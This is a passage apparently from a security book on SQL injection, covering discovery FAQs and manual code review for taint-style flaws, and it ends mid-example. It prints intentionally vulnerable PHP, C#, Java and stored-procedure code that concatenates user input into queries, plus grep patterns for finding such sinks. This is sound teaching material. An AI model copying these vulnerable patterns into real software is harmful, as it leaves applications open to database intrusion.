injection discovery • the processes involved in finding sql injection vulnerabilities can be automated to a certain extent. automation can be very beneficial when you need to test large web sites; however, you need to be aware that automatic discovery tools may not identify some of the existing vulnerabilities. don’t rely fully on automated tools. • several commercial tools provide a full security assessment of a web site, including testing for sql injection vulnerabilities. • the free and open source tools offer a good alternat ive to aid you in the process of finding sql injection vulnerabilities in large sites. frequently asked questions q: can every single web application be vulnerable to sql injection? a: no, sql injection vulnerabilities can be present only in applications which access a sql database. if an application doesn’t connect to any database, it will not be vulnerable to sql injection vulnerabilities. if the application connects to a database, thi s doesn’t necessarily mean that it is vulnerable. it is your job to find out. q: i observe a weird behavior in a web application when i insert a single quote in the search functionality. however, i don’t get any errors. can the application be exploited? a: well, it depends. if it turns out to be a sql injection vulnerability then yes, you can exploit an application even if it doesn’t return database errors. the inference process to craft a valid sql statement is a bit harder, but it is just a matter of following an educated trial -and-error process. q: what is the difference between sql injection and blind sql injection? a: regular sql injection happens when the application returns data from the database and presents it to you. in a blind sql injection vulner ability, you get only two different responses which correspond to a true and false condition in the injection. q: why do i need to automate blind sql injection exploitation and i don’t have to automate regular sql injection? a: exploitation of blind sql in jection vulnerabilities requires around five or six requests to the remote web server to find out each character. to display the full version of the database server you may require several hundred requests, rendering a manual approach arduous and unfeasibl e. q: what is the main reason for the presence of sql injection vulnerabilities? a: the main process failure is generated when the web application performs insufficient sanitization and/or output encoding of user -provided data. additionally, the attacker c an take advantage of other issues, such as poor design or bad coding practices. however, all of these can be exploited as a consequence of the lack of input sanitization. q: i have detected and confirmed a blind sql injection vulnerability, but the typical exploitation tools don’t seem to work. a: blind sql injection is slightly different every time, and sometimes the existing tools can’t exploit every scenario. verify that the vulnerability can be demonstrated manually and that your tool has been configure d correctly. if it still doesn’t work, my recommendation is that you read the source code of one of your tools and customize it to meet your needs. chapter 3 reviewing code for sql injection dave hartley solutions in this chapter: • reviewing source code f or sql injection • automated source code review introduction often, the quickest way to find potential areas for sql injection in an application is to review an application’s source code. also, if you are a developer who is not allowed to use sql injection testing tools as part of your development process (not an uncommon situation in banks, and usually something for which you can be fired) it may be your only option. some forms of dynamic string building and execution are also clear from a quick review of code. what is often not clear is whether the data used in these queries are sourced from the user’s browser, or whether they have been correctly validated or encoded prior to being submitted back to the user. these are just some of the challenges facing th e code reviewer when hunting for sql injection bugs. this chapter covers tips and tricks for finding sql injection in code, from identifying where the user -controllable input can enter the application, to identifying the types of code constructs that can l ead to an sql injection exposure. in addition to manual techniques, we will also look at automating source code reviews using some of the tools available, and examples of using these tools to speed up the review process. reviewing source code for sql injection there are two main methods of analyzing the source code for vulnerabilities: static code analysis and dynamic code analysis. static code analysis is the process of analyzing the source code without actually executing the code. dynamic code analysis is the analysis of code performed at runtime. manual static code analysis involves reviewing the source code line by line to identify potential vulnerabilities. however, with large applications that have many lines of code, it is often not feasible to scrutinize each line. the task can be very time -consuming and laborious. to counter this, security consultants and developers often write tools and scripts, or use various developer and operating system tools, to help with the task of reviewing large code bases. it is very important to adopt a methodical approach when reviewing the source code. the goal of the code review is to locate and analyze areas of the code that may have application security implications. the approach pre sented in this chapter is targeted at the detection of taint- style vulnerabilities. tainted data are data that have been received from an untrusted source (internal variables can also become tainted if tainted data are copied to them). you can untaint tain ted data through the use of proven sanitization routines or input validation functions. tainted data can potentially cause security problems at vulnerable points in the program; these vulnerable points are referred to as sinks . in the context of reviewing code for sql injection vulnerabilities, we will refer to a sink as a security -sensitive function that is used to execute sql statements against a database. to narrow the focus of the review, we should begin by identifying potential sinks. this is not an easy task, as each programming language offers a number of different ways to construct and execute sql statements (these are listed in detail in “dangerous functions” later in this chapter). once you have identified a sink, it may be very obvious that sql injection vulnerability exists. however, in most cases you will have to dig a little deeper into the code base to determine whether one exists. sql injection vulnerabilities most commonly occur when the web application developer does not ensure that values r eceived from a sink source (a method from where the tainted data originates, such as a web form, cookie, input parameter, etc.) are validated before passing them to sql queries that will be executed on a database server. the following line of php code illustrates this: $result = mysql_query(“select ∗ from table where column = ‘$_get[“param”]’”); the preceding code is vulnerable to sql injection because user input is passed directly to a dynamically constructed sql statement and is executed without first being validated. in most cases, identifying a function that is used to create and execute sql statements will not be the end of the process, as it may not be possible from the line of code to easily identify the presence of a vulnerability. for example, the l ine of the php code that follows is potentially vulnerable, but you can’t be sure, as you do not know whether the $param variable is tainted or whether it is validated before it is passed to the function: $result = mysql_query(“select ∗ from table where column = ‘$param’”); to make an informed decision as to whether a vulnerability exists, you need to trace the variable to its origin and follow its flow through the application. to do this you need to identify the entry points into the application (the sink source), and search the source code to identify at what point the $param variable is assigned a value. you are trying to identify a line of the php code that is similar to the one that follows: $param = $_get[“param”]; the preceding line assigns the user -controlled data to the $param variable. once an entry point is identified, it is important to trace the input to discover where and how the data are used. you can do this by tracing the execution flow. if the trace found the following two lines of php code, you could safely deduce that the application was vulnerable to sql injection within the user -controlled parameter $param : $param = $_get[“param”]; $result = mysql_query(“select ∗ from table where field = ‘ $param’” ); the preceding code is vulnerable to sql injection because a tainted variable ( $param ) is passed directly to a dynamically constructed sql statement ( sink) and is executed. if the trace found the following three lines of php code, you could also safely deduce that the application was vulnerable to sql injection; however, a limit is imposed on the length of the input. this means it may or may not be possible to effectively exploit the issue. you need to start tracing the $limit variable to see exactly how much space is available for an injection: $param = $_get[“param”]; if (strlen($param) < $limit){error_handler(“param exceeds max length!”)} $result = mysql_query(“select ∗ from table where field = ‘ $param’” ); if the trace found the following two lines of php code, you could deduce that the developer made an attempt at preventing sql injection: $param = mysql_real_escape_string($param); $result = mysql_query(“select ∗ from table where field = ‘ $param’” ); the magic_quotes() , addslashes() , and mysql_real_escape_string() filters cannot completely prevent the presence or exploitation of an sql injection vulnerability. certain techniques used in conjunction with environmental conditions will allow an attacker to exploit the vulnerability. because of this, you can deduce that the application may be vulnerable to sql injection within the user -controlled parameter $param . as you can see from the previous contrived and simplified examples, the process of reviewing the source code for sql injection vulnerabilities requires a lot of work. it is important to map all dependencies and trace all data flows so that you can identify tainted and untainted inputs as well as use a degree of acumen to prove or disprove the feasibility of a vulnerability being exploitable. by following a metho dical approach, you can ensure that the review reliably identifies and proves the presence (or absence) of all potential sql injection vulnerabilities. you should start any review by identifying functions that are used to build and execute sql statements ( sinks ) with user -controlled input that is potentially tainted; then you should identify entry points for user -controlled data that are being passed to these functions ( sink sources ) and, finally, trace the user -controlled data through the application’s exe cution flow to ascertain whether the data are tainted when it reaches the sink. you can then make an informed decision as to whether a vulnerability exists and how feasible it would be to exploit it. to simplify the task of performing a manual code review, you can build complex scripts or programs in any language to grab various patterns in the source code and link them together. the following sections of this chapter will show you examples of what to look for in php, c#, and java code. you can apply the pr inciples and techniques to other languages as well, and they will prove to be very useful in identifying other coding flaws. dangerous coding behaviors to perform an effective source code review and identify all potential sql injection vulnerabilities, you need to be able to recognize dangerous coding behaviors, such as code that incorporates dynamic string -building techniques. chapter 1 introduced some of these techniques, in the section “understanding how it happens”; here you will build upon the lessons you learned so that you can identify the dangerous coding behaviors in a given language. to get started, the follo wing lines build strings that are concatenated with tainted input (data that have not been validated): // a dynamically built sql string statement in php $sql = “select ∗ from table where field = ‘$_get[“input”]’”; // a dynamically built sql string statement in c# string sql = “select ∗ from table where field = ’” +request.getparameter(“ input”) + “’”; // a dynamically built sql string statement in java string sql = “select ∗ from table where field = ’” +request.getparameter(“ input”) + “’”; the php, c#, and java source code presented next shows how some developers dynamically build and execute sql statements that contain user -controlled data that have not been validated. it is important that you are able to identify this coding behavior when reviewing the sou rce code for vulnerabilities: // a dynamically executed sql statement in php mysql_query(“select ∗ from table where field = ‘$_get[“input”]’”); // a dynamically executed sql string statement in c# sqlcommand command = new sqlcommand(“select ∗ from table where field = ’” +request.getparameter(“input”) + “’”, connection); // a dynamically executed sql string statement in java resultset rs = s.executequery(“select ∗ from table where field = ’” +request.getparameter(“ input”) + “’”); some developers believe that if they do not build and execute dynamic sql statements and instead only pass data to stored procedures such as parameters, their code will not be vulnerable. however, this is not true, as stored procedures can be vulnerable to sql injection also. a store d procedure is a set of sql statements with an assigned name that’s stored in a database. here is an example of a vulnerable microsoft sql server stored procedure: // vulnerable stored procedure in ms sql create procedure sp_storedprocedure @input varchar(400) = null as declare @sql nvarchar(4000) select @sql = ‘select field from table where field = ’’’ + @input + ’’’’ exec (@sql) in the preceding example, the @input variable is taken directly from the user input and concatenated with the sql string (i.e. @sql). the sql string is passed to the exec function as a parameter and is executed. the preceding microsoft sql server stored procedure is vulnerable to sql injection even though the user input is being passed to it as a parameter. the microsoft sql server database is not the only database where stored procedures can be vulnerable to sql injection. here is the source code for a vulnerable mysql stored procedure: // vulnerable stored procedure in mysql create procedure sp_ storedprocedure (input varchar(400)) begin set @param = input; set @sql = concat(‘select field from table where field=’,@param); prepare stmt from @sql; execute stmt; deallocate prepare stmt; end in the preceding example, the input variable is taken directly from the user input and concatenated with the sql string ( @sql). the sql string is passed to the execute function as a parameter and is executed. the preceding mysql stored procedure is vulnerable to sql injection even though the user input is passed to it as a parameter. just as with microsoft sql server and mysql databases, oracle database stored procedures can also be vulnerable to sql injection. here is the source code for a vulnerable oracle stored procedure: -- vulnerable stored procedure in oracle create or replace procedure sp_ storedprocedure (input in varchar2) as sql varchar2; begin sql:= ‘select field from table where field = ’’’ || input || ‘‘’’; execute immediate sql; end; in the preceding case, the input variable is taken directly from the user input and concatenated with the sql string ( sql). the sql string is passed to the execute function as a parameter and is executed. the preceding oracle stored procedure is vulnerable to sql injection even though the user input is passed to it as a parameter. developers use slightly different methods for interacting with stored procedures. the following lines of code are presented as examples of how some developers execute stored procedures from within their code: // a dynamically executed sql stored procedure in php $result = mysql_query(“select sp_storedprocedure($_get[‘input’])”); // a dynamically executed sql stored procedure in c# sqlcommand cmd = new sqlcommand(“sp_storedprocedure”, conn); cmd.commandtype = comma ndtype.storedprocedure; cmd.parameters.add(new sqlparameter(“@input”,request.getparameter(“input”))); sqldatareader rdr = cmd.executereader(); // a dynamically executed sql stored procedure in java callablestatement cs = con.preparecall(“{call sp storedprocedurerequest.getparameter(“input”)}”); string output = cs.executeupdate(); the preceding lines of code all execute and pass user -controlled tainted data as parameters to sql stored procedures. if the stored procedures are incorrectly constructed in a similar fashion to the examples presented previously, an exploitable sql injection vulnerability may exist. when reviewing the source code, not only is it important to identify vulnerabilities in the application source code, but in cases where stored procedures are in use, you may have to review the sql code of stored procedures as well . the example source code given in this section should be sufficient to help you understand how developers produce code that is vulnerable to sql injection. however, the examples given are not extensive; each programming language offers a number of differe nt ways to construct and execute sql statements, and you need to be familiar with all of them (i list them in detail for c#, php, and java in “dangerous functions” later in this chapter). to make a definitive claim that a vulnerability exists in the code b ase, it is necessary to identify the application’s entry points ( sink sources ) to ensure that the user -controlled input can be used to smuggle in sql statements. to achieve this, you need to be familiar with how user-controllable input gets into the applic ation. again, each programming language offers a number of different ways to obtain user input. the most common method of taking in user input is by using an html form. the following html code illustrates how a web form is created: <form name=“simple_form” method=“get” action=“process_input.php”> <input type=“text” name=“foo”> <input type=“text” name=“bar”> <input type=“submit” value=“submit”> </form> in html, you can specify two different submission methods for a form: you can use either the get or the pos t method. you specify the method inside a form element, using the method attribute. the difference between the get method and the post method is primarily defined in terms of form data encoding. the preceding form uses the get method; this means the web br owser will encode the form data within the url. if the form used the post method, it would mean the form data would appear within a message body. if you were to submit the preceding form via the post method, you would see “http://www.victim.com/process_input.php” in the address bar. if you were to submit the information via the get method, you would see the address bar change to “http://www.victim.com/process_input.php?foo=input&bar=input ”. everything after the question mark (?) is known as the query string. the query string holds the user input submitted via the form (or submitted manually in the url). parameters are separated by an ampersand (&) or a semicolon (;) and parameter names and values are separated by an equals sign (=). the get method has a size limit imposed upon it because the data are encoded within the url and the maximum length of a url is 2048 characters. the post method has no size limitations. the action attribute specifies the url of the script, which processes the form. web applications also make use of web cookies. a cookie is a general mechanism that server -side connections can use to both store and retrie ve information on the client side of a connection. cookies allow web developers to save information on the client machine and retrieve the data for processing at a later stage. application developers may also use http headers. http headers form the core of an http request, and are very important in an http response. they define various characteristics of the data that are requested or the data that have been provided. when php is used on a web server to handle an http request, it converts information submit ted in the http request as predefined variables. the following functions are available to php developers for processing this user input: • $_get: an associative array of variables passed via the http get method • $http_get_vars: same as $_get, deprecated i n php version 4.1.0 • $_post: an associative array of variables passed via the http post method • $http_post_vars: same as $_post, deprecated in php version 4.1.0 • $_request: an associative array that contains the contents of $_get, $_post, and $_cookie • $_cookie: an associative array of variables passed to the current script via http cookies • $http_cookie_vars: same as $_cookie, deprecated in php version 4.1.0 • $_server: server and execution environment information • $http_server_vars: same as $_server , deprecated in php version 4.1.0 the following lines of code demonstrate how you can use these functions in a php application: // $_get - an associative array of variables passed via the get method $variable = $_get[‘name’]; // $http_get_vars - an associa tive array of variables passed via the http // get method, depreciated in php v4.1.0 $variable = $get_get_vars[‘name’]; // $_post - an associative array of variables passed via the post method $variable = $_post[‘name’]; // $http_post_vars - an associative array of variables passed via the post // method, depreciated in php v4.1.0 $variable = $http_post_vars[‘name’]; // $_request - an associative array that contains the contents of $_get, // $_post & $_cookie $variable = $_request[‘name’]; // $_cookie - an associative array of variables passed via http cookies $variable = $_cookie[‘name’]; // $_server - server and execution environment information $variable = $_server[‘name’]; // $http_server_vars - server and execution env ironment information, // depreciated in php v4.1.0. $variable = $http_server_vars[‘name’] php has a very well -known setting, register_globals , which you can configure from within php’s configuration file ( php.ini ) to register the egpcs (environment, get, p ost, cookie, server) variables as global variables. for example, if register_globals is on, the url “http://www.victim.com/process_input.php?foo=input ” will declare $foo as a global variable with no code required (there are serious security issues with this setting, and as such it has been deprecated and should always be turned off). if register_globals is enabled, user input can be retrieved via the input element and is referenced via the name attribute within an html form. for example: $variable = $foo; in java, the process is fairly similar. you use the request object to get the value that the client passes to the web server during an http request. the request object takes the value from th e client’s web browser and passes it to the server via an http request. the class or the interface name of the object request is httpservletrequest . you write the object request as javax.servlet.http.httpservletrequest . numerous methods are available for t he request object. we are interested in the following functions, which are used for processing user input: • getparameter( ): used to return the value of a requested given parameter • getparametervalues( ): used to return all the values of a given parameter’s request as an array • getquerystring( ): used to return the query string from the request • getheader( ): used to return the value of the requested header • getheaders( ): used to return the values of the requested header as an enumeration of string objects • getrequestedsessionid( ): returns the session id specified by the client • getcookies( ): returns an array of cookie objects • cookie.getvalue( ): used to return the value of a requested given cookie value the following lines of code demonstrate how you can use these functions in a java application: // getparameter() - used to return the value of a requested given parameter string string_variable = request.getparameter(“name”); // getparametervalues() - used to return all the values of a given // parameter’s request as an array string[] string_array = request.getparametervalues(“name”); // getquerystring() - used to return the query string from the request string string_variable = request.getquerystring(); // getheader() - used to return the value of the requested header string string_variable = request.getheader(“user -agent”); // getheaders() – used to return the values of the requested header as an // enumeration of string objects enumeration enumeration_object = request.getheaders(“user- agent”); // getrequestedsessionid() - returns the session id specified by the client string string_variable = request.getrequestedsessionid(); // getcookies() - returns an array of cookie objects cookie[] cookie_array = request.getcookies(); // cookie.getvalue() - used to return the value of a requested given cookie // value string string_variable = cookie_array.getvalue(“name”); in c# applications, developers use the httprequest class, which is part of the system.web namespace. it contains properties and methods necessary to handle an http request, as well as all information passed by the browser, including all form variables, certificates, and header information. it also contains the cgi server vari ables. here are the properties of the class: • httpcookiecollection: a collection of all the cookies passed by the client in the current request • form: a collection of all form values passed from the client during the submission of a form • headers: a col lection of all the headers passed by the client in the request • params: a combined collection of all query string, form, cookie, and server variables • querystring: a collection of all query string items in the current request • servervariables: a collect ion of all the web server variables for the current request • url: returns an object of type uri • useragent: contains the user -agent header for the browser that is making the request • userhostaddress: contains the remote internet protocol (ip) address of the client • userhostname: contains the remote host name of the client the following lines of code demonstrate how you can use these functions in a c# application: // httpcookiecollection - a collection of all the cookies httpcookiecollection variable = request.cookies; // form - a collection of all form values string variable = request.form[“name”]; // headers - a collection of all the headers string variable = request.headers[“name”]; // params - a combined collection of all querystring, form, cookie, and // server variables string variable = request.params[“name”]; // querystring - a collection of all querystring items string variable = request.querystring[“name”]; // servervariables - a collection of all the web server variables string variable = request.servervariables[“name”]; // url - returns an object of type uri, the query property contains // information included in the specified uri i.e ?foo=bar. uri object_variable = request.url; string variable = object_variable. query; // useragent - contains the user- agent header for the browser string variable = request.useragent; // userhostaddress - contains the remote ip address of the client string variable = request.userhostaddress; // userhostname - contains the remote host name of the client string variable = request.userhostname; dangerous functions in the previous section, we looked at how user -controlled input gets into an application, and learned the v arying methods that are at our disposal to process these data. we also looked at a few simple examples of the dangerous coding behaviors that can ultimately lead to vulnerable applications. the example source code i provided in the previous section should be sufficient to help you understand how developers produce code that is vulnerable to sql injection. however, the examples were not extensive; each programming language offers a number of different ways to construct and execute sql statements, and you nee d to be familiar with all of them. this section of the chapter presents a detailed list of these methods, along with examples of how they are used. we will start with the php scripting language. php supports numerous database vendors; visit http://www.php.net/manual/en/refs.database.vendors.php for a comprehensive list. we will concentrate on just a few common database vendors for the purpose of clarity. the following list details the re levant functions for mysql, microsoft sql server, postgres, and oracle databases: • mssql_query( ): sends a query to the currently active database • mysql_query( ): sends a query to the currently active database • mysql_db_query( ): selects a database, and executes a query on it (depreciated in php version 4.0.6) • oci_parse( ): parses a statement before it is executed (prior to oci_execute( )/ociexecute( )) • ora_parse( ): parses a statement before it is executed (prior to ora_exec( )) • mssql_bind( ): add s a parameter to a stored procedure (prior to mssql_execute( )) • mssql_execute( ): executes a stored procedure • odbc_prepare( ): prepares a statement for execution (prior to odbc_execute( )) • odbc_execute( ): executes an sql statement • odbc_exec( ): prepares and executes an sql statement • pg_query( ): execute a query (used to be called pg_exec) • pg_exec( ): is still available for compatibility reasons, but users are encouraged to use the newer name • pg_send_query( ): sends an asynchronous query • pg_send_query_params( ): submits a command and separate parameters to the server without waiting for the result(s) • pg_query_params( ): submits a command to the server and waits for the result • pg_send_prepare( ): sends a request to create a prepared statem ent with the given parameters, without waiting for completion • pg_prepare( ): submits a request to create a prepared statement with the given parameters, and waits for completion • pg_select( ): selects records specified by assoc_array • pg_update( ): upd ates records that matches condition with data • pg_insert( ): inserts the values of an assoc_array into a given table • pg_delete( ): deletes records from a table specified by the keys and values in assoc_array the following lines of code demonstrate how y ou can use these functions in a php application: // mssql_query() - sends a query to the currently active database $result = mssql_query($sql); // mysql_query() - sends a query to the currently active database $result = mysql_query($sql); // mysql_db_query() - selects a database, and executes a query on it $result = mysql_db_query($db, $sql); // oci_parse() - parses a statement before it is executed $stmt = oci_parse($connection, $sql); ociexecute($stmt); // ora_parse() - parses a statement before it is executed if (!ora_parse($cursor, $sql)){exit;} else {ora_exec($cursor);} // mssql_bind() - adds a parameter to a stored procedure mssql_bind($stmt, ‘@param’, $variable, sqlvarchar, false, false, 100); $result = mssql_execute($stmt); // odbc_prepare() - prepares a statement for execution $stmt = odbc_prepare($db, $sql); $result = odbc_execute($stmt); // odbc_exec() - prepare and execute a sql statement $result = odbc_exec($db, $sql); // pg_query - execute a query (used to be called pg_exec) $result = pg_query($conn, $sql); // pg_exec - is still available for compatibility reasons, but users are encouraged to use the newer name. $result = pg_exec($conn, $sql); // pg_send_query - sends asynchronous query pg_send_query($conn, $sql); // pg_send_query_params - submits a command and separate parameters to the server without waiting for the result(s). pg_send_query_params($conn, $sql, $params) // pg_query_params - submits a command to the server and waits for the result. pg_query_params($conn, $sql, $params) // pg_send_prepare - sends a request to create a prepared statement with the given parameters, without waiting for completion. pg_send_prepare($conn, “my_query”, ‘select ∗ from table where field = $1 ’); pg_send_execute($conn, “my_query”, $var); // pg_prepare - submits a request to create a prepared statement with the given parameters, and waits for completion. pg_prepare($conn, “my_query”, ‘select ∗ from table where field = $1’ ); pg_execute($conn, “my_query”, $var); // pg_select - selects records specified by assoc_array which has field=>value $result = pg_select($conn, $table_name, $assoc_array) // pg_update() - updates records that matches condition with data pg_update($conn, $arr_update, $arr_where); // pg_insert() - inserts the values of assoc_array into the table specified by table_name. pg_insert($conn, $table_name, $assoc_array) // pg_delete() - deletes records from a table specified by the keys and values in assoc_array pg_delete($conn, $table_name, $assoc_array) things are a little differe nt in java. java makes available the java.sql package and the java database connectivity (jdbc) api for database connectivity; for details on supported vendors, see http://java.sun.com/products/jdbc/driverdesc.html. we will concentrate on just a few common database vendors for the purpose of clarity. the following list details the relevant functions for mysql, microsoft sql server, postgresql, and oracle databases: • createstatement( ): creat es a statement object for sending sql statements to the database • preparestatement( ): creates a precompiled sql statement and stores it in an object • executequery( ): executes the given sql statement • executeupdate( ): executes the given sql statement • execute( ): executes the given sql statement • addbatch( ): adds the given sql command to the current list of commands • executebatch( ): submits a batch of commands to the database for execution the following lines of code demonstrate how you can use these functions in a java application: // createstatement() - is used to create a statement object that is used for // sending sql statements to the specified database statement = connection.createstatement(); // preparedstatement – creates a precompiled sql statement and stores it // in an object. preparedstatement sql = con.preparestatement(sql); // executequery() - sql query to retrieve values from the specified table. result = statement.executequery(sql); // executeupdate () - executes an sql statement, which may be an // insert, update, or delete statement or a statement that returns nothing result = statement.executeupdate(sql); // execute() - sql query to retrieve values from the specified table. result = statement.execute(sql); // addbatch() - adds the given sql command to the current list of commands statement.addbatch(sql); statement.addbatch(more_sql); as you may expect, microsoft and c# developers do things a little differently. see www.connectionstrings.com for a comprehensive collection of providers. application developers typically use the following namespaces: • system.data.sqlclient: .net framework data provider for sql server • system.data.oledb: .net framework data provider for ole db • system.data.oracleclient: .net framework data provider for oracle • system.data.odbc: .net framework data provider for odbc the following is a list of classes that are used within the namespaces: • sqlcommand( ): used to construct/send an sql statement or stored procedure • sqlparameter( ): used to add parameters to an sqlcommand object • oledbcommand( ): used to construct/send an sql statement or stored procedure • oledbparameter( ): used to add parameters to an ol edbcommand object • oraclecommand( ): used to construct/send an sql statement or stored procedure • oracleparameter( ): used to add parameters to an oraclesqlcommand object • odbccommand( ): used to construct/send an sql statement or stored procedure • odb cparameter( ): used to add parameters to an odbccommand object the following lines of code demonstrate how you can use these classes in a c# application: // sqlcommand() - used to construct or send an sql statement sqlcommand command = new sqlcommand(sql, connection); // sqlparameter() - used to add parameters to an sqlcommand object sqlcommand command = new sqlcommand(sql, connection); command.parameters.add(“@param”, sqldbtype.varchar, 50).value = input; // oledbcommand() - used to construct or send an sql statement oledbcommand command = new oledbcommand(sql, connection); // oledbparameter() - used to add parameters to an oledbcommand object oledbcommand command = new oledbcommand($sql, connection); command.parameters.add(“@param”, oledbtype.varchar, 50).value = input; // oraclecommand() - used to construct or send an sql statement oraclecommand command = new oraclecommand(sql, connection); // oracleparameter() - used to add parameters to an oraclecommand object oraclecommand command = new oraclecommand(sql, connection); command.parameters.add(“@param”, oledbtype.varchar, 50).value = input; // odbccommand() - used to construct or send an sql statement odbccommand command = new odbccommand(sql, connection); // odbcparameter() - used to add parameters to an odbccommand object odbccommand command = new odbccommand(sql, connection); command.parameters.add(“@param”, oledbtype.varchar, 50).value = input; following the data now that you have a good understanding of how web applications obtain input from the user, the methods that developers use within their chosen language to process the data, and how bad coding behaviors can lead to the presence of an sql injection vulnerability, let’s put what you have learned to test by attempting to identify an sql injection vulnerability and tracing the user-controlled data through the application. our methodical approach begins with identifying the use of dangerous functions ( sinks ). you can conduct a manual source code review by reviewing each line of code using a text editor or development ide (integrated development environment). however, being thorough can be a resource- intensive, time -consuming, and laborious process. to save time and quickly identify code that should be ma nually inspected in more detail, the simplest and most straightforward approach is to use the unix utility grep (also available for windows systems). we will need to compile a comprehensive list of tried and tested search strings to identify lines of code that could potentially be vulnerable to sql injection, as each programming language offers a number of different ways to receive and process input as well as a myriad of methods to construct and execute sql statements. tools & traps... where’s ya tool? the grep tool is a command -line text search utility originally written for unix and found on most unix derivative operating systems by default, such as linux and os x. grep is also now available for windows, and you can obtain it from http://gnuwin32.sourceforge.net/packages/grep.htm . however, if you prefer to use native windows utilities you can use the findstr command, which can also search for patterns of text in files using regular expression s; for a syntax reference see http://technet.microsoft.com/en -us/library/bb490907.aspx . another tool that is very useful is awk, a general -purpose programming language that is designe d for processing text-based data, either in files or in data streams; awk is also found on most unix derivative operating systems by default. the awk utility is also available to windows users; you can obtain gawk (gnu awk) from http://gnuwin32.sourceforge.net/packages/gawk.htm . following data in php we will start with a php application. before performing a source code review of the php code, it is always important to check the status of register_globals and magic_quotes . you configure these settings from within the php configuration file ( php.ini ). the register_globals setting registers the egpcs variables as global variables. this often leads to a variety of vulnerabilities, as the user can influence them. as of php 4.2.0, this functionality is disabled by default. however, some applications require it to function correctly. the magic_quotes option is deprecated as of php version 5.3.0 and will be removed from php in version 6.0.0. magic_quot es is a security feature implemented by php to escape potentially harmful characters passed to the application, including single quotes, double quotes, backslashes, and null characters. having ascertained the status of these two options you can begin inspe cting the code. you can use the following command to recursively search a directory of source files for the use of mssql_query() , mysql_db_query() , and mysql_query() with direct user input into an sql statement. the command will print the filename and line number containing the match; awk is used to “prettify” the output: $ grep - r -n “\\(mysql\\|mssql\\|mysql_db\\ )_query\\(.∗\\$\\(get\\|\\post\\) .∗\\)” src/ | awk - f: ‘{print “filename: “$1” \\nline: “$2”\\ nmatch: “$3” \\n\\n”}’ filename: src/mssql_query.vuln.php line: 11 match: $result = mssql_query(“select ∗ from tbl where column = ‘ $_get[‘var’]’”); filename: src/mysql_query.vuln.php line: 13 match: $result = mysql_query(“select ∗ from tbl where column = ‘$_get[‘var’]’”, $link); you can also use the following command to recursively search a directory of source files for the use of oci_parse() and ora_parse() with direct user input into an sql statement. these functions are used prior to oci_exec() , ora_exec() , and oci_execute() to compile an sql statement: $ grep -r -n “\\(oci\\|ora\\)_parse\\ (.∗\\$_\\(get\\|\\post\\).∗\\)” src/ | awk -f: ‘{print “filename: “$1”\\nline: “$2”\\nmatch: “$3”\\n\\n”}’ filename: src/oci_parse.vuln.php line: 4 match: $stid = oci_parse($conn, “select ∗ from table where column = ‘ $_get[‘var’]’”); filename: src/ora_parse.vuln.php line: 13 match: ora_parse($curs,“select ∗ from table where column = ‘ $_get[‘var’]’”); you can use the following command to recursively search a directory of source files for the use of odbc_prepare() and odbc_exec() with direct user input into an sql statement. the odbc_prepare() function is used prior to odbc_execute() to compile an sql st atement: $ grep -r -n “\\(odbc_prepare\\ |odbc_exec\\ )\\(.∗\\$_\\(get\\|\\post\\).∗\\)” src/ | awk -f: ‘{print “filename: “$1”\\nline: “$2”\\nmatch: “$ 3”\\n\\n”}’ filename: src/odbc_exec.vuln.php line: 3 match: $result = odbc_exec ($con, “select ∗ from table where colum n = ‘$_get[‘var’]’”); filename: src/odbc_prepare.vuln.php line: 3 match: $result = odbc_prepare ($con, “select ∗ from table where column = ‘ $_get[‘var’]’”); you can use the following command to recursively search a directory of source files for the use of mssql_bind() with direct user input into an sql statement. this function is used prior to mssql_execute() to compile an sql statement: $ grep - r -n “mssql_bind\\ (.∗\\$_\\(get\\|\\post\\).∗\\)” src/|awk -f: ‘{print “filename: “$1”\\nline: “$2”\\nmatch: “$3”\\n\\n”}’ filename: src/mssql_bind.vuln.php line: 8 match: mssql_bind($sp, “@paramone”, $_get[‘var_one’], sqlvarchar, false, false, 150); filename: src/mssql_bind.vuln.php line: 9 match: mssql_bind($sp, “@paramtwo”, $_get[‘var_two’], sqlvarchar, false, false, 50); you can easily combine these grep one-liners into a simple shell script and trivially modify the output so that the data can be presented in xml, html, csv, and other formats. you can use the string searches to find all of the low -hanging fruit, such as the dynamic construction of parameters for input into stored procedures and sql statements, where the input is not validated and is input directly from get or post parameters. the problem is that even though a lot of developers do not validate their input before using it in dynamically created sql statements, they first copy the input to a named variable. for example, the following code would be vulnerable; however, our simple grep strings would not identify lines of code such as these: $sql = “select ∗ from tbl where column = ‘$_get[‘var’]’” $result = mysql_query($sql, $link); we should amend our grep strings so that they identify the use of the functions themselves. for example: $ grep - r -n “mssql_query(\\ |mysql_query(\\ |mysql_db_query(\\ |oci_parse (\\|ora_parse(\\ |mssql_bind(\\ |mssql_execute( \\|odbc_prepare(\\ |odbc_execute (\\|odbc_execute(\\ |odbc_exec(”src/ | awk -f:‘{print “filename: “$1”\\ nline: “$2”\\ nmatch: “$3”\\n\\n”}’ the output from the preceding command will identify all of the same lines of code that the previous grep strings would; however, it will also identify all points in the source code where the potentially dangerous functions are being used, and it will identify a number of lines that will require manual inspection. for example, it may identify the follow ing line: filename: src/sqli.mysql.vulnerable.php line: 20 match: $result = mysql_query($sql); the mysql_query() function is used to send a query to the currently active database. you can see from the line found that the function is in use. however, you do not know what the value of the $sql variable is; it probably contains an sql statement to execute, but you do not know whether it was built using user input or whether it is tainted. so, at this stage, you cannot say whether a vulnerability exists. you need to trace the $sql variable. to do this you can use the following command: $ grep - r -n “\\$sql” src/ | awk - f: ‘{print “filename: “$1”\\ nline: “$2” \\nmatch: “$3”\\ n\\n”}’ the problem with the preceding command is that often, developers reuse variables or use common names, so you may end up with some results that do not correspond to the function you are investigating. you can improve the situation by expanding the command to search for common sql commands. you could try the following grep command to identify points in the code where dynamic sql statements are created: $ grep – i -r -n “\\$sql =.∗ \\”\\(select\\ |update\\ |insert\\ |drop\\) ” src/ | awk -f: ‘{print “filename: “$1”\\nline: “$2”\\nmatch: “$3”\\n\\n”}’ if you’re very lucky, you will find only one match, as illustrated here: filename: src/sqli.mysql.vulnerable.php line: 20 match: $sql = “select ∗ from table where field = ‘ $_get[‘input’]’”; in the real world, it is likely that with an ambiguous variable name such as “ $sql,” you would identify a number of lines in a number of different source files, and you would need to ensure that you are dealing with the right variable and the right function, class, or procedure. you can see from the output that the sql statement is a select statement and it is being built with user -controlled data that is being presented to the application inside a get met hod. the parameter name is name. you can be confident that you have discovered an sql vulnerability, as it appears that the user data obtained from the input parameter was concatenated with the $sql variable before being passed to a function that executes the statement against a database. however, you could just as easily have received the following output: filename: src/sqli.mysql.vulnerable.php line: 20 match: $sql = “select ∗ from table 